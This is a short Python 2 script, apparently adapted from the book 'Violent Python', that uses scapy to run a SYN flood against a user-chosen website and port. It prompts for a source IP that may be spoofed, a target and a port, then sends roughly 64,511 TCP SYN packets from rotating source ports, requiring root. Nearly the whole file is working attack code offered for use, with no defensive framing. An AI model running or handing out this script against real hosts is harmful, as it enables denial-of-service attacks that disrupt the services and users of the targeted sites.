#!/usr/bin/env python2
# written by Moses Arocha
# Created with the help of TJ O'Connor "Violent Python"


from scapy.all import *

import socket
import sys
import os

def SynAttack(Source, Target, Destination_Port): 
    for sport in range(1024, 65535):				# Continues to send packets 64,511 times
        IP_layer = IP(src=Source, dst=Target)			 
	TCP_layer = TCP(sport=sport, dport=Destination_Port)	# The destination port of attack is defined by the user, required!
	packet = IP_layer / TCP_layer
	send(packet)				

Source = raw_input("\n\n\t What is the Source IP Address : ")
Target = raw_input("\n\n\t What is the Website Wished To Attack? http://") 
socket.gethostbyname(Target)					# Allows the intergretion of a NS lookup, so users can insert websites.
Destination_Port = int(raw_input("\n\n\t What Port Would You Like To Attack Through? : ")) 

if not os.geteuid() == 0:
    sys.exit('Must Be Root!')
SynAttack(Source, Target, Destination_Port)	 # References the SynAttack function, must be placed last so all error handling can occur.
